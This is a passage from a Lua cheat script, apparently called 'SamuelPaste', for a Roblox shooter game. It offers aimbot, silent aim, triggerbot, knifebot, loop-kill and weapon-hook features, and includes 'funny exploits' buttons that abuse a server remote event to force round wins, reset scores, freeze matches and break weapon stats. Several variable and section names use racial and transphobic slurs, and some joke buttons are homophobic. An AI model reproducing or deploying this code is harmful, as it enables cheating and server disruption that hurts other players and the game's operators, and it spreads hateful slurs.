				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				game.ReplicatedStorage.Viewmodels["awpAZIM"].Name = "v_AWP"
			end
		end
		--scout
		if values.skins['custom models'].model.Scroll['Scout'] ~= 'None' then
			if values.skins['custom models'].model.Scroll['Scout'] == 'Newan' then
				game.ReplicatedStorage.Viewmodels["v_Scout"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7161433164')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				game.ReplicatedStorage.Viewmodels["v_Scoutnewan"].Name = "v_Scout"				
			elseif values.skins['custom models'].model.Scroll['Scout'] == 'M1 Garand' then
				game.ReplicatedStorage.Viewmodels["v_Scout"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://6477587469')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				game.ReplicatedStorage.Viewmodels["v_M1 Garand"].Name = "v_Scout"
			elseif values.skins['custom models'].model.Scroll['Scout'] == 'CS:GO' then
				game.ReplicatedStorage.Viewmodels["v_Scout"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7161407697')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				game.ReplicatedStorage.Viewmodels["v_Scoutfever"].Name = "v_Scout"
			else
				game.ReplicatedStorage.Viewmodels["v_Scout"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://6477284418')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				game.ReplicatedStorage.Viewmodels["v_Railgun"].Name = "v_Scout"
			end
		end
		--AutoSniper
		if values.skins['custom models'].model.Scroll['AutoSniper'] ~= 'None' then
			game.ReplicatedStorage.Viewmodels["v_G3SG1"]:Destroy()
			wait()
			local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
			game:GetObjects('rbxassetid://6477308219')[1].Parent = Model1
			Model = game.ReplicatedStorage.Viewmodels.Model
			for _, Child in next, Model:GetChildren() do
				Child.Parent = Model.Parent
			end
			Model:Destroy()
			game.ReplicatedStorage.Viewmodels["v_Barrett"].Name = "v_G3SG1"
		end
		--AK
		if values.skins['custom models'].model.Scroll['AK'] ~= 'None' then 
			game.ReplicatedStorage.Viewmodels["v_AK47"]:Destroy()
			wait()
			local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
			game:GetObjects('rbxassetid://7161345483')[1].Parent = Model1
			Model = game.ReplicatedStorage.Viewmodels.Model
			for _, Child in next, Model:GetChildren() do
				Child.Parent = Model.Parent
			end
			Model:Destroy()
			game.ReplicatedStorage.Viewmodels["v_AK47drangon"].Name = "v_AK47"
		end
		--USP
		if values.skins['custom models'].model.Scroll['USP'] ~= 'None' then
			game.ReplicatedStorage.Viewmodels["v_USP"]:Destroy()
			wait()
			local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
			game:GetObjects('rbxassetid://7161365495')[1].Parent = Model1
			Model = game.ReplicatedStorage.Viewmodels.Model
			for _, Child in next, Model:GetChildren() do
				Child.Parent = Model.Parent
			end
			Model:Destroy()
			game.ReplicatedStorage.Viewmodels["v_USPnew"].Name = "v_USP"
		end
		if values.skins['custom models'].model.Scroll['Knives'] ~= 'None' then
			if values.skins['custom models'].model.Scroll['Knives'] == 'Bowie' then
				game.ReplicatedStorage.Viewmodels["v_CT Knife"]:Destroy()
				game.ReplicatedStorage.Viewmodels["v_T Knife"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7161240289')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7161240289')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				wait()
				game.ReplicatedStorage.Viewmodels["v_bowknife"].Name = "v_CT Knife"
				game.ReplicatedStorage.Viewmodels["v_bowknife"].Name = "v_T Knife"
			elseif values.skins['custom models'].model.Scroll['Knives'] == 'Netherite sword' then
				game.ReplicatedStorage.Viewmodels["v_CT Knife"]:Destroy()
				game.ReplicatedStorage.Viewmodels["v_T Knife"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7917769386')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7917769386')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				wait()
				game.ReplicatedStorage.Viewmodels["SwordMC"].Name = "v_CT Knife"
				game.ReplicatedStorage.Viewmodels["SwordMC"].Name = "v_T Knife"
				wait()
				game.ReplicatedStorage.Viewmodels["v_CT Knife"].Handle.TextureID = "rbxassetid://7375049028"
				game.ReplicatedStorage.Viewmodels["v_T Knife"].Handle.TextureID = "rbxassetid://7375049028"
			elseif values.skins['custom models'].model.Scroll['Knives'] == 'Shadow Daggers Fade' then
				game.ReplicatedStorage.Viewmodels["v_CT Knife"]:Destroy()
				game.ReplicatedStorage.Viewmodels["v_T Knife"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7161082619')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7161082619')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				wait()
				game.ReplicatedStorage.Viewmodels["v_daggers"].Name = "v_CT Knife"
				game.ReplicatedStorage.Viewmodels["v_daggers"].Name = "v_T Knife"
			end
		end
end)





local other = others:Sector("other", "Left") 
other:Element("Scroll", "lua", {options = allluas, Amount = 5}) 
other:Element("Button", "load", {}, function() 
	loadstring(readfile("SamuelPaste/lua\\"..values.others["other"].lua.Scroll))() 
end)


local luas2 = others:Sector("Scripts", "Right")
luas2:Element("Button", "Rejoin", nil, function()
tpservice= game:GetService("TeleportService")
plr = game.Players.LocalPlayer

tpservice:Teleport(game.PlaceId, plr)
end)
luas2:Element("Button", "Serverhop", nil, function()
	local x = {}
	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
	if #x > 0 then
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[C.RANDOM(1, #x)])
	else
		return print("Failed")
	end
end)
other:Element("Button", "Fps boost", nil, function()
 repeat wait() until game:IsLoaded()
 for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Part"
or v.ClassName == "SpawnLocation"
or v.ClassName == "WedgePart"
or v.ClassName == "Terrain"
or v.ClassName == "MeshPart" then
v.Material = "Plastic"
end
end

for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Decal"
or v.ClassName == "Texture" then
v:Destroy()
end
end
end)
other:Element('Button', 'dick size', {}, function()
local dicksize = '='
local dicksizerep = string.rep(dicksize, C.RANDOM(0, 20))
CreateHitElement(" Your dick is 8"..dicksizerep.."D",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
if C.LEN(dicksizerep) == 0 then
CreateHitElement(" small penis hhhhh noob get good ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
elseif C.LEN(dicksizerep) == 20 then
CreateHitElement(" omg biggest penis ever real ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
end
end)

other:Element('Button', 'how gay you are', {}, function()
local procent = C.RANDOM(1, 100)
CreateHitElement(" You're "..procent.. '% gay',values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 180, 0, 22)
	if procent == 100 then
		CreateHitElement(" Lmao clipped ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 180, 0, 22)
		elseif procent == 50 then
		CreateHitElement(" Does that mean you're a femboy? ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 180, 0, 22)
		elseif procent == 0 then
		CreateHitElement(" Holy shit real you're not gay ?!?!?!?!?!",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 180, 0, 22)
	end
end)

other:Element('Button', 'skill issue rate', {}, function()
local procent = C.RANDOM(1, 100)
CreateHitElement(" You're "..procent.. '% skill issue ',values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 180, 0, 22)
	if procent == 100 then
		CreateHitElement(" Lmao clipped noob get good kid ez ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 200, 0, 22)
		elseif procent == 50 then
		CreateHitElement(" Ok ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 180, 0, 22)
		elseif procent == 0 then
		CreateHitElement(" Pro ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 180, 0, 22)
	end
end)

--other:Element('Dropdown', 'Copy colors type', {options = {'RGB', 'HSV', 'HEX',}}) --hsl, cmyk
other:Element('Button2', 'clean gui', nil, function()
game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = C.UDIM2(0, 5, 0, 0)

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0

game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0

game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0

game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0

game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0

game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = C.COL3RGB(60, 60, 60)

game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "Samuel"

game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "Paste"

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = C.UDIM2(0, 0, 0, 0)

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = C.UDIM2(0, 206, 0, 40)

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = C.UDIM2(0, 6, 0, 230)

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = "SamuelPaste"

game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = C.COL3RGB(255, 255, 255)

game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham

game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

--game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = C.UDIM2(1, 0, 0, 36)
game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()
end)
other:Element('Button2', 'UnLoad script', {}, function()
writefile(cfglocation..'unload script cfg.txt', game:HttpGet("https://raw.githubusercontent.com/SamuelMoment/SamuelMoment/main/nothing.cfg"))
--big ass code (not big ass)
ConfigLoad1:Fire('unload script cfg.txt')
wait(1)
RunService:UnbindFromRenderStep("Rage")
delfile(cfglocation..'unload script cfg.txt')
game.CoreGui['electric boogalo']:Destroy()
getgenv().PasteDisabled = true
end)

local trannyenabled = false
local socks = false

local niggers = others:Sector("trannyware", "Left") 

local a = C.INST("MeshPart",workspace)
a.Size = C.Vec3(1.35,1.4,1.35)
a.CanCollide = false
a.Anchored = true
a.MeshId = "rbxassetid://4249338569"
a.TextureID = "rbxassetid://4249293955"

niggers:Element('Toggle', 'skirt', {}, function(tbl)
    trannyenabled = tbl.Toggle
end)

niggers:Element('Toggle', 'socks', {}, function(tbl)
    socks = tbl.Toggle
end)



local chinahatsector = others:Sector('China hat', 'Left')
chinahatsector:Element('ToggleColor', 'enabled')
chinahatsector:Element('Dropdown', 'animation', {options = {"none", 'default',"scanning", "lava", "pulse"}})
chinahatsector:Element('ToggleColor', 'trails')

RunService.RenderStepped:connect(function()
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("LowerTorso") and trannyenabled then
        a.Position = game.Players.LocalPlayer.Character.LowerTorso.Position
        a.Rotation = game.Players.LocalPlayer.Character.LowerTorso.Rotation
    end
    if socks and game.Players.LocalPlayer.Character then
        if game.Players.LocalPlayer.Character:FindFirstChild("Pants") then
            game.Players.LocalPlayer.Character.Pants.PantsTemplate = "rbxassetid://5381345577"
        end
    end
    a.Transparency = trannyenabled and 0 or 1
	
	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('UpperTorso') and values.others['China hat'].enabled.Toggle and not LocalPlayer.Character:FindFirstChild('PlainMenacingStrawHatAccessory') then 
		local l = ChinaHat['China hat'].PlainMenacingStrawHatAccessory:Clone()
		l.Parent = LocalPlayer.Character
		l.Handle.Color = values.others['China hat'].enabled.Color
		for _, v in pairs(LocalPlayer.Character:FindFirstChild('PlainMenacingStrawHatAccessory'):GetChildren()) do
			if v.Name == 'Trail' then
				v.Enabled = values.others['China hat'].trails.Toggle
				v.Color = values.others['China hat'].trails.Color
			end
		end
		local AccessoryWeld = Instance.new('Weld')
		AccessoryWeld.Name = 'AccessoryWeld'
		AccessoryWeld.Parent = l.Handle
		AccessoryWeld.Part1 = LocalPlayer.Character.Head
		AccessoryWeld.Part0 = l.Handle
		AccessoryWeld.C0 = C.CF(0, -0.6, 0)
	end
	
	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('UpperTorso') and LocalPlayer.Character:FindFirstChild('PlainMenacingStrawHatAccessory') and not values.others['China hat'].enabled.Toggle then
		LocalPlayer.Character:FindFirstChild('PlainMenacingStrawHatAccessory'):Destroy()
	elseif values.others['China hat'].enabled.Toggle and LocalPlayer.Character:FindFirstChild('PlainMenacingStrawHatAccessory') then
		local obj = LocalPlayer.Character:FindFirstChild('PlainMenacingStrawHatAccessory')
		if values.others['China hat'].animation.Dropdown == "none" then
			obj.Handle.SpecialMesh.TextureId = ""
		elseif values.others['China hat'].animation.Dropdown == "scanning" then
			obj.Handle.SpecialMesh.TextureId = "rbxassetid://5843010904"
		elseif values.others['China hat'].animation.Dropdown == "lava" then
			obj.Handle.SpecialMesh.TextureId = "rbxassetid://53883408"
		elseif values.others['China hat'].animation.Dropdown == "pulse" then
			obj.Handle.SpecialMesh.TextureId = "rbxassetid://wtf"
		elseif values.others['China hat'].animation.Dropdown == 'default' then
			obj.Handle.SpecialMesh.TextureId = 'rbxassetid://8369894581'
		end
		if obj.Handle.Color ~= values.others['China hat'].enabled.Color then
			obj.Handle.Color = values.others['China hat'].enabled.Color
		end
		for _, v in pairs(LocalPlayer.Character:FindFirstChild('PlainMenacingStrawHatAccessory'):GetChildren()) do
			if v.Name == 'Trail' then
				v.Enabled = values.others['China hat'].trails.Toggle
				v.Color = values.others['China hat'].trails.Color
			end
		end
	end
end)

local daddy = others:Sector('Change weapon', 'Left')

daddy:Element('Button', 'hook weapon', {}, function()
-- pasted from google
 -- AWP, AK47, G3SG1, ect.
local givefunc
for _, v in pairs(getgc()) do
local parentScript = rawget(getfenv(v), "script")

    if type(v) == "function" and parentScript == game:GetService("Players").LocalPlayer.PlayerGui.Client and islclosure(v) and not is_synapse_function(v) and debug.getinfo(v).name == "giveTool" then
        givefunc = v
        break
    end
end
debug.setupvalue(givefunc, (values.others['Change weapon']['what slot'].Dropdown == 'knife' and 5 or values.others['Change weapon']['what slot'].Dropdown == 'pistol' and 7 or values.others['Change weapon']['what slot'].Dropdown == 'primary' and 8 or values.others['Change weapon']['what slot'].Dropdown == '1th greande slot' and 9 or values.others['Change weapon']['what slot'].Dropdown == '2nd grenade slot' and 10 or values.others['Change weapon']['what slot'].Dropdown == '3rd grendae slot' and 11 or values.others['Change weapon']['what slot'].Dropdown == '4th grenade slot' and 12 or values.others['Change weapon']['what slot'].Dropdown == 'bomb slot' and 13), values.others['Change weapon']['weapon'].Scroll[values.others['Change weapon']['weapon'].Dropdown]) -- index 7 = secondary wep, index 8 = primary wep (i think lol. forgor)
end)

local mydadbeatsme = { 
	Pistol = {"USP", "P2000", "Glock", "DualBerettas", "P250", "FiveSeven", "Tec9", "CZ", "DesertEagle", "R8"}, 
	SMG = {"MP9", "MAC10", "MP7", "UMP", "P90", "Bizon"}, 
	Rifle = {"M4A4", "M4A1", "AK47", "Famas", "Galil", "AUG", "SG"}, 
	Sniper = {"AWP", "Scout", "G3SG1"},
	Other = {'XM', 'Nova', 'M249', 'MAG7', 'Negev', 'SawedOff', 'C4'}
} 

daddy:Element('Dropdown', 'what slot', {options = {'knife', 'pistol', 'primary', '1st grenade slot', '2nd grenade slot', '3rd grenade slot', '4th grenade slot', 'bomb slot'}})
daddy:Element('ScrollDrop', 'weapon', {options = mydadbeatsme})


if game.GameId == 3698756756 then
local ssExploits = others:Sector('funny exploits', 'Right')


ssExploits:Element('Button', 'funny msg', {}, function()
game.ReplicatedStorage.Events.IDBody:FireServer("id", {
    Identified = {Value = false},
    Name = values.others['funny exploits']['msg part 1'].Text,
    Role = {Value = values.others['funny exploits']['msg part 2'].Text}
})
end)
ssExploits:Element('TextBox', 'msg part 1',{placeholder = "funny msg part 1"})
ssExploits:Element('TextBox', 'msg part 2', {placeholder = "funny msg part 2"})
ssExploits:Element('Button', 'win T', {}, function()
	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.Exploded})
end)
ssExploits:Element('Button', 'win CT', {}, function()
	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.Defused})
end)
ssExploits:Element('Button', 'reset scores', {}, function()
	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.CTWins})
	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.TWins})

	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.Preparation})
	--game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.GameOver})
	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.CanRespawn})
	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = game.ReplicatedStorage.Warmup})
	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = game.ReplicatedStorage.Warmup})
end)

ssExploits:Element('Button', 'no ammo', {}, function()
	for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
		if v:FindFirstChild("Ammo") then
			game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = v.Ammo}) -- no ammo
		end
	end
end)
ssExploits:Element('Button', 'no auto', {}, function()
	for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
		if v:FindFirstChild("Auto") then
			game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = v.Auto})
		end
	end
end)
ssExploits:Element('Button', 'no firerate', {}, function()
	for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
		if v:FindFirstChild("FireRate") then
			game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = v.FireRate})
		end
	end
end)
ssExploits:Element('Button', 'no spread', {}, function()
	for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
		if v:FindFirstChild("Spread") then
			game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = v.Spread})
		end
	end
end)
ssExploits:Element('Button', 'no reload time', {}, function()
	for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
		if v:FindFirstChild("ReloadTime") then
			game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = v.ReloadTime}) -- breaks reload lol
		end
	end
end)
ssExploits:Element('Button', 'no recoil', {}, function()
	for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do
		if v:FindFirstChild("Recoil") then
			game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = v.Recoil.AngleX})
			game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = v.Recoil.AngleY})
		end
	end
end)
ssExploits:Element('Button', 'freeze game', {}, function()
	game.ReplicatedStorage.Events.IDBody:FireServer("id", {Identified = workspace.Status.Preparation}) -- breaks reload lol
end)

end
local copy = others:Sector("Disord links", "Right") 
copy:Element("Button", "My discord", {}, function() 
	setclipboard("IAmSamuel#9008") 
end)
copy:Element("Button", "Cideware", {}, function() 
	setclipboard("C17H21NO4#9758")
end)
copy:Element("Button", "mad", {}, function() 
	setclipboard("mad#6636")
end)
copy:Element("Button", "tinp0g", {}, function() 
	setclipboard("tinp0g#8576")
end)


local characters = skins:Sector("characters", "Right") 
characters:Element("Toggle", "character changer", nil, function(tbl) 
	if tbl.Toggle then 
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Gun") then 
			ChangeCharacter(ChrModels:FindFirstChild(values.skins.characters.skin.Scroll)) 
		end 
	end 
end) 
characters:Element("Scroll", "skin", {options = AllCharacters, Amount = 9, alphabet = true}, function(tbl) 
	if values.skins.characters["character changer"].Toggle then 
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Gun") then 
			ChangeCharacter(ChrModels:FindFirstChild(tbl.Scroll)) 
		end 
	end 
end) 
local retardskins = skins:Sector('Misc', 'Right')
retardskins:Element('Toggle', 'Remove sleeves')

local aimbot = legit:Sector("aimbot", "Left") 
aimbot:Element("ToggleKeybind", "aim assist") 
aimbot:Element("ToggleKeybind", "silent aim") 
aimbot:Element("ToggleKeybind", "triggerbot") 

local main = legit:MSector("main", "Left") 
local default = main:Tab('default')




	default:Element("Jumbobox", "conditions", {options = {"visible", "standing", "blind", "smoke"}}) 
	default:Element("Dropdown", "target", {options = {"crosshair", "health", "distance"}}) 
	default:Element("Dropdown", "hitbox", {options = {"closest", "head", "chest"}}) 
	default:Element("Slider", "FOV", {min = 30, max = 420, default = 120}) 
	default:Element("Slider", "smoothing", {min = 1, max = 50, default = 1}) 
	default:Element("Toggle", "silent aim") 
	default:Element("Slider", "hitchance", {min = 1, max = 100, default = 100}) 
	default:Element("Dropdown", "priority", {options = {"closest", "head", "chest"}}) 
	default:Element("Toggle", "triggerbot") 
	default:Element("Slider", "delay (ms)", {min = 0, max = 300, default = 200}) 
	default:Element("Slider", "minimum dmg", {min = 0, max = 100, default = 15})
			 

local settings = legit:Sector("settings", "Right") 
settings:Element("Toggle", "free for all") 
settings:Element('ToggleTrans', 'draw fov', {default = {Color = C.COL3RGB(255,255,255), Transparency = 0}})
settings:Element('Toggle', 'filled fov')
settings:Element('Slider', 'fov thickness', {min = 1, max = 10, default = 1})
settings:Element("Toggle", "forcefield check") 


local aimbot = rage:Sector("aimbot", "Left") -- values.rage.aimbot.enabled.Toggle --local aimbot = rage:Sector("aimbot", "Left")

aimbot:Element("Toggle", "enabled") 
--aimbot:Element('Toggle', 'override all other rages')
aimbot:Element("Dropdown", "origin", {options = {"character", "camera"}}) 
aimbot:Element("Toggle", "silent aim") 
aimbot:Element("Dropdown", "automatic fire", {options = {"off", "standard", "hitpart"}}) 
aimbot:Element("Toggle", "automatic penetration")
aimbot:Element("Slider", "automatic penetration modifier", {min = 1, max = 500, default = 1})
--aimbot:Element("ToggleColor", "Hitlogs", {default = {Color = MainUIColor}})
aimbot:Element("Jumbobox", "resolver", {options = {"pitch", "roll", "arms", "animation", 'bhop'}})

aimbot:Element("Toggle", "delay shot") 
aimbot:Element("ToggleKeybind", "force hit")
aimbot:Element('Dropdown', 'prediction', {options = {'off', 'cframe', 'velocity', 'automatic'}})
aimbot:Element("Slider", "automatic multiplier", {min = -100, max = 100, default = 0})
aimbot:Element("Slider", "automatic multiplier2", {min = -100, max = 100, default = 0})
aimbot:Element("Toggle", "teammates") 
aimbot:Element("Toggle", "auto baim") 
			aimbot:Element("Toggle", "knifebot")
			aimbot:Element("Dropdown", "knifebot type", {options = {"normal", "rapid"}}) 
			aimbot:Element("Slider", "Knifebot Radius", {min = -1, max = 9000, default = 20})
			aimbot:Element("Toggle", "knife wallcheck")
			
-------------------------------------------------------------------------------------------------------------------------------




local weapons = rage:MSector("weapons", "Left") 
local default = weapons:Tab("default")
default:Element("Jumbobox", "hitboxes", {options = {"head", "torso", "legs"}})
	default:Element("Toggle", "prefer body") 
	default:Element("Slider", "minimum damage", {min = -100, max = 100, default = 20})
	default:Element("Slider", "max fov", {min = 1, max = 180, default = 180}) 


local loopkillloop

local Loopkill = rage:Sector("Loop kill", "Right") 
Loopkill:Element("lmao", "Player", {options = loopkillplr, Amount = 20}, function(tbl)
	pcall(function()
		loopkillloop:Disconnect()
	end)
 	if game.Players:FindFirstChild(tbl.Dropdown) then
		loopkillloop = RunService.RenderStepped:Connect(function()
